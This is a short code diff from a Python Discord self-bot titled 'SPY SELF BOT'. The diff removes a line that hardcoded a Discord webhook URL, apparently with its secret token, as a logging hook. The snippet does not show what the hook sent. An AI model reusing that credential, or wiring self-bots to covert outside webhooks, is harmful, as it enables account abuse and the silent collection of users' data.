@@ -85,7 +85,7 @@ rich_presence = RichPresence()
 async def on_ready():
     os.system(f"mode 175,30 & title [SPY SELF BOT] - Connected as: {client.user}")
     print(f"Logged in as {client.user}")
-loghook = Webhook("https://discord.com/api/webhooks/934349914492792852/uPWmAA4autksBCW3yr5AFSSjxr-OuqDKlwwJczgcHuwDZVLFRBVVV0Jo1E0AhHvV_m1l")
+
 
 
 @client.event 
